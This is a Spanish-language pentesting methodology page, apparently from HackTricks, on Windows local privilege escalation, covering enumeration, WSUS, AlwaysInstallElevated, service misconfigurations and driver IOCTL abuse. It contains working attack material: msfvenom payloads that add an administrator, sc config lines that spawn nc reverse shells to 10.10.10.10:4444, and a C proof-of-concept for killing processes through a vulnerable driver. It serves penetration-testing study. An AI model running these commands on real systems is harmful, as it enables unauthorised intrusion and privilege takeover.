# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Mejor herramienta para buscar Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoría inicial de Windows

### Tokens de acceso

**Si no sabes qué son los Windows Access Tokens, lee la siguiente página antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulta la siguiente página para más información sobre ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Niveles de integridad

**Si no sabes qué son los niveles de integridad en Windows deberías leer la siguiente página antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Controles de seguridad de Windows

Hay diferentes cosas en Windows que podrían **impedirte enumerar el sistema**, ejecutar ejecutables o incluso **detectar tus actividades**. Deberías **leer** la siguiente **página** y **enumerar** todos estos **mecanismos** **de defensa** antes de comenzar la privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Información del sistema

### Enumeración de información de versión

Comprueba si la versión de Windows tiene alguna vulnerabilidad conocida (revisa también los parches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Explots por versión

Este [sitio](https://msrc.microsoft.com/update-guide/vulnerability) es útil para buscar información detallada sobre vulnerabilidades de seguridad de Microsoft. Esta base de datos tiene más de 4.700 vulnerabilidades de seguridad, mostrando la **enorme superficie de ataque** que presenta un entorno Windows.

**En el sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tiene watson integrado)_

**Localmente con información del sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Entorno

¿Alguna credencial/información valiosa guardada en las variables de entorno?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historial de PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Archivos de transcripción de PowerShell

Puedes aprender cómo activar esto en [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Se registran detalles de las ejecuciones del pipeline de PowerShell, que abarcan los comandos ejecutados, las invocaciones de comandos y partes de scripts. Sin embargo, no siempre se capturan los detalles completos de la ejecución ni los resultados de salida.

Para habilitar esto, sigue las instrucciones en la sección "Transcript files" de la documentación, optando por **"Module Logging"** en lugar de **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para ver los últimos 15 eventos de los registros de Powershell, puede ejecutar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Se captura un registro completo de la actividad y del contenido de la ejecución del script, asegurando que cada bloque de código quede documentado mientras se ejecuta. Este proceso preserva un audit trail exhaustivo de cada actividad, valioso para forensics y para analizar comportamiento malicioso. Al documentar toda la actividad en el momento de la ejecución, se obtienen conocimientos detallados sobre el proceso.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Los eventos de Script Block pueden ubicarse en el Windows Event Viewer en la ruta: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Para ver los últimos 20 eventos puedes usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configuración de Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unidades
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puedes comprometer el sistema si las actualizaciones no se solicitan usando http**S** sino http.

Empiezas comprobando si la red usa una actualización WSUS sin SSL ejecutando lo siguiente en cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
O lo siguiente en PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Si recibes una respuesta como alguna de estas:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Y si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` es igual a `1`.

Entonces, **es explotable.** Si el último registro es igual a 0, entonces la entrada WSUS será ignorada.

Para explotar esta vulnerabilidad puedes usar herramientas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Estos son scripts explotadores MiTM armados para inyectar actualizaciones 'falsas' en tráfico WSUS no SSL.

Lee la investigación aquí:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Básicamente, este es el fallo que explota este bug:

> Si tenemos el poder de modificar el proxy del usuario local, y Windows Updates usa el proxy configurado en la configuración de Internet Explorer, entonces tenemos la capacidad de ejecutar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nuestro propio tráfico y ejecutar código como un usuario elevado en nuestro activo.
>
> Además, dado que el servicio WSUS usa la configuración del usuario actual, también usará su almacén de certificados. Si generamos un certificado self-signed para el hostname de WSUS y añadimos este certificado al almacén de certificados del usuario actual, podremos interceptar tanto tráfico WSUS HTTP como HTTPS. WSUS no usa mecanismos tipo HSTS para implementar una validación trust-on-first-use del certificado. Si el certificado presentado es confiable para el usuario y tiene el hostname correcto, será aceptado por el servicio.

Puedes explotar esta vulnerabilidad usando la herramienta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una vez que esté liberada).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Muchos agentes empresariales exponen una superficie IPC en localhost y un canal de actualización privilegiado. Si la inscripción puede ser forzada hacia un servidor atacante y el updater confía en una CA raíz rogue o en comprobaciones de firma débiles, un usuario local puede entregar un MSI malicioso que el servicio SYSTEM instala. Consulta una técnica generalizada (basada en la cadena Netskope stAgentSvc – CVE-2025-0309) aquí:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Una vulnerabilidad de **local privilege escalation** existe en entornos **domain** de Windows bajo condiciones específicas. Estas condiciones incluyen entornos donde **LDAP signing is not enforced,** los usuarios poseen derechos para configurarse a sí mismos permitiéndoles configurar **Resource-Based Constrained Delegation (RBCD),** y la capacidad de los usuarios para crear equipos dentro del dominio. Es importante notar que estos **requisitos** se cumplen usando la **configuración por defecto**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Si** estas 2 entradas de registro están **habilitadas** (valor **0x1**), entonces usuarios de cualquier privilegio pueden **instalar** (ejecutar) `*.msi` como NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Si tienes una sesión de meterpreter puedes automatizar esta técnica usando el módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa el comando `Write-UserAddMSI` de power-up para crear dentro del directorio actual un binario MSI de Windows para escalar privilegios. Este script genera un instalador MSI precompilado que solicita la adición de un usuario/grupo (así que necesitarás GIU access):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Crear MSI con WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Crear MSI con Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
- There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
- Right-click the project and select **View > Custom Actions**.
- Right-click **Install** and select **Add Custom Action**.
- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
- Finalmente, **compílalo**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### Instalación MSI

Para ejecutar la **instalación** del archivo `.msi` malicioso en segundo plano:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explotar esta vulnerabilidad puedes usar: _exploit/windows/local/always_install_elevated_

## Antivirus y Detectores

### Configuración de auditoría

Estas configuraciones deciden qué se está **registrando**, por lo que debes prestar atención
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding: es interesante saber a dónde se envían los logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** está diseñado para la **gestión de las contraseñas del Administrador local**, asegurando que cada contraseña sea **única, aleatoria y actualizada periódicamente** en equipos unidos a un dominio. Estas contraseñas se almacenan de forma segura en Active Directory y solo pueden ser accedidas por usuarios a quienes se les hayan otorgado permisos suficientes mediante ACLs, permitiéndoles ver las contraseñas de administrador local si están autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Si está activo, **las contraseñas en texto plano se almacenan en LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

A partir de **Windows 8.1**, Microsoft introdujo una protección mejorada para la Local Security Authority (LSA) para **bloquear** intentos de procesos no confiables de **leer su memoria** o inyectar código, fortaleciendo la seguridad del sistema.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** se introdujo en **Windows 10**. Su propósito es proteger las credenciales almacenadas en un dispositivo frente a amenazas como ataques pass-the-hash.| [**Más información sobre Credential Guard aquí.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Credenciales en caché

**Las credenciales de dominio** son autenticadas por la **Local Security Authority** (LSA) y utilizadas por componentes del sistema operativo. Cuando los datos de inicio de sesión de un usuario son autenticados por un paquete de seguridad registrado, por lo general se establecen las credenciales de dominio para el usuario.\
[**Más información sobre Credenciales en caché aquí**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Usuarios & Groups

### Enumerate Users & Groups

Deberías comprobar si alguno de los grupos a los que perteneces tiene permisos interesantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupos privilegiados

Si **perteneces a algún grupo privilegiado, podrías escalar privilegios**. Aprende sobre los grupos privilegiados y cómo abusar de ellos para escalar privilegios aquí:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulación de tokens

**Aprende más** sobre qué es un **token** en esta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la siguiente página para **aprender sobre tokens interesantes** y cómo abusar de ellos:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Usuarios conectados / Sesiones
```bash
qwinsta
klist sessions
```
### Carpetas de usuario
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Política de contraseñas
```bash
net accounts
```
### Obtener el contenido del portapapeles
```bash
powershell -command "Get-Clipboard"
```
## Procesos en ejecución

### Permisos de archivos y carpetas

Antes que nada, al listar los procesos, verifica si hay contraseñas dentro de la línea de comando del proceso.\
Comprueba si puedes **sobrescribir algún binario en ejecución** o si tienes permisos de escritura en la carpeta del binario para explotar posibles [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Comprueba siempre si hay posibles [**electron/cef/chromium debuggers** ejecutándose, podrías abusar de ellos para escalar privilegios](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Comprobando permisos de los binarios de los procesos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Comprobando los permisos de las carpetas de los binarios de los procesos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Puedes crear un volcado de memoria de un proceso en ejecución usando **procdump** de sysinternals. Servicios como FTP suelen tener las **credenciales en texto claro en memoria**, intenta volcar la memoria y leer las credenciales.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplicaciones GUI inseguras

**Las aplicaciones que se ejecutan como SYSTEM pueden permitir a un usuario abrir un CMD o explorar directorios.**

Ejemplo: "Windows Help and Support" (Windows + F1), busca "command prompt", haz clic en "Click to open Command Prompt"

## Servicios

Obtener una lista de servicios:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permisos

Puedes usar **sc** para obtener información de un servicio
```bash
sc qc <service_name>
```
Se recomienda disponer del binario **accesschk** de _Sysinternals_ para comprobar el nivel de privilegios requerido para cada servicio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Se recomienda comprobar si "Authenticated Users" pueden modificar algún servicio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar servicio

Si estás teniendo este error (por ejemplo con SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Puedes habilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Ten en cuenta que el servicio upnphost depende de SSDPSRV para funcionar (en XP SP1)**

**Otra solución alternativa** de este problema es ejecutar:
```
sc.exe config usosvc start= auto
```
### **Modificar la ruta del binario del servicio**

En el escenario en el que el grupo "Authenticated users" posee **SERVICE_ALL_ACCESS** sobre un servicio, es posible modificar el binario ejecutable del servicio. Para modificar y ejecutar **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar servicio
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Los privilegios se pueden escalar a través de varios permisos:

- **SERVICE_CHANGE_CONFIG**: Permite la reconfiguración del binario del servicio.
- **WRITE_DAC**: Permite reconfigurar permisos, lo que conduce a la capacidad de cambiar las configuraciones del servicio.
- **WRITE_OWNER**: Permite adquirir la propiedad y reconfigurar permisos.
- **GENERIC_WRITE**: Hereda la capacidad de cambiar las configuraciones del servicio.
- **GENERIC_ALL**: También hereda la capacidad de cambiar las configuraciones del servicio.

Para la detección y explotación de esta vulnerabilidad, se puede utilizar _exploit/windows/local/service_permissions_.

### Permisos débiles en binarios de servicios

**Comprueba si puedes modificar el binario que se ejecuta por un servicio** o si tienes **permisos de escritura en la carpeta** donde está ubicado el binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puedes obtener cada binario que es ejecutado por un servicio usando **wmic** (not in system32) y comprobar tus permisos usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
También puedes usar **sc** y **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permisos para modificar el registro de servicios

Deberías comprobar si puedes modificar algún registro de servicio.\
Puedes **comprobar** tus **permisos** sobre un **registro** de servicio haciendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Debe comprobarse si **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** poseen permisos `FullControl`. Si es así, el binario ejecutado por el servicio puede ser alterado.

Para cambiar el Path del binario ejecutado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

Si tienes este permiso sobre un registry significa que **puedes crear sub registries desde este**. En el caso de Windows services esto es **suficiente para ejecutar código arbitrario:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Si la ruta a un ejecutable no está entre comillas, Windows intentará ejecutar cada terminación antes de un espacio.

Por ejemplo, para la ruta _C:\Program Files\Some Folder\Service.exe_ Windows intentará ejecutar:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Enumera todas las rutas de servicio sin comillas, excluyendo las que pertenezcan a los servicios integrados de Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puedes detectar y explotar** esta vulnerabilidad con metasploit: `exploit/windows/local/trusted\_service\_path` Puedes crear manualmente un binario de servicio con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows permite a los usuarios especificar acciones a realizar si un servicio falla. Esta característica puede configurarse para apuntar a un binary. Si este binary puede ser reemplazado, podría ser posible privilege escalation. Más detalles pueden encontrarse en la [documentación oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplicaciones

### Aplicaciones instaladas

Revisa los **permissions of the binaries** (quizá puedas overwrite uno y escalate privileges) y de las **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permisos de escritura

Comprueba si puedes modificar algún config file para leer algún archivo especial o si puedes modificar algún binary que va a ser ejecutado por una cuenta Administrator (schedtasks).

Una forma de encontrar permisos débiles en carpetas/archivos del sistema es haciendo:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Ejecutar al inicio

**Comprueba si puedes sobrescribir algún registry o binary que vaya a ser ejecutado por otro usuario.**\
**Lee** la **siguiente página** para aprender más sobre interesantes **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Busca posibles **drivers de terceros extraños/vulnerables**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Si un driver expone una primitiva de lectura/escritura arbitraria en kernel (común en controladores IOCTL mal diseñados), puedes escalar robando un token SYSTEM directamente de la memoria del kernel. Consulta la técnica paso a paso aquí:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Abuso de la falta de FILE_DEVICE_SECURE_OPEN en objetos de dispositivo (LPE + EDR kill)

Algunos drivers de terceros firmados crean su objeto de dispositivo con un SDDL fuerte vía IoCreateDeviceSecure pero olvidan establecer FILE_DEVICE_SECURE_OPEN en DeviceCharacteristics. Sin este flag, el DACL seguro no se aplica cuando el dispositivo se abre mediante una ruta que contiene un componente adicional, permitiendo que cualquier usuario sin privilegios obtenga un handle usando una ruta de espacio de nombres como:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Una vez que un usuario puede abrir el dispositivo, los IOCTL privilegiados expuestos por el driver pueden ser abusados para LPE y manipulación. Capacidades observadas en entornos reales:
- Devolver handles con acceso total a procesos arbitrarios (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Lectura/escritura sin restricciones del disco raw (manipulación offline, trucos de persistencia en arranque).
- Terminar procesos arbitrarios, incluidos Protected Process/Light (PP/PPL), permitiendo kill de AV/EDR desde user land vía kernel.

Patrón mínimo de PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Siempre establezca FILE_DEVICE_SECURE_OPEN al crear objetos de dispositivo que se pretendan restringir mediante un DACL.
- Valide el contexto del caller para operaciones privilegiadas. Añada verificaciones PP/PPL antes de permitir la terminación de procesos o la devolución de handles.
- Restringa IOCTLs (access masks, METHOD_*, input validation) y considere modelos brokered en lugar de privilegios directos del kernel.

Detection ideas for defenders
